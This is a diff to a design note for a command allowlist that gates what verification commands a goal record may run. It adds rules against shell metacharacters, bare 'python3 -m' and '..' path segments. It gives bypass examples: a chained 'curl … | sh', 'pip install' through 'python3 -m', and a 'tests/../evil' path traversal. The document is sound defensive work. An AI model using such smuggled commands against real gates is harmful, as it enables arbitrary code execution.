@@ -50,13 +50,29 @@ Each command runs under `bash -euo pipefail` with the repo root as cwd.
 record execute anything, so a command must satisfy **both** rules:
 
 1. start with an allowed prefix — `pytest`, `npm test`, `npm run`, `bash tests/`,
-   `python3 -m`, `moon run`, `prek run`; and
-2. contain no shell metacharacter: `; & | ` $ > < \` or newline.
+   `python3 -m pytest`, `python3 -m unittest`, `moon run`, `prek run`;
+2. contain no shell metacharacter: `; & | ` $ > < \` or newline; and
+3. contain no `..` path segment.
 
 Rule 2 is what makes rule 1 real. A prefix check alone is defeated by
 `npm test && curl … | sh` — the command starts with `npm test` and does
 something else entirely. Prefixes also respect word boundaries, so `npm test`
 does not authorise `npm testfoo`.
+
+Rules 1 and 3 were both narrowed after an adversarial pass ran real code past
+the gate:
+
+- **A bare `python3 -m` admitted any module.** `python3 -m pip install <x>` is
+  arbitrary package installation — arbitrary code execution straight from a goal
+  record, with no metacharacter in sight. Fixed by naming the two test runners
+  instead of the interpreter flag.
+- **`bash tests/` was not a boundary.** `bash tests/../evil/x.sh` satisfies the
+  prefix and executes a script outside `tests/` entirely. A prefix that names a
+  directory means nothing if the path can climb out of it.
+
+The lesson generalises: a prefix ending in a directory or a plugin flag is a
+prefix that admits *anything after it*. Treat every addition as a security
+change, and ask what the most hostile completion of that prefix does.
 
 This is the line between `verification[]` being **data** and being **code**.
 Widening the allowlist widens what a goal record can execute; treat additions as
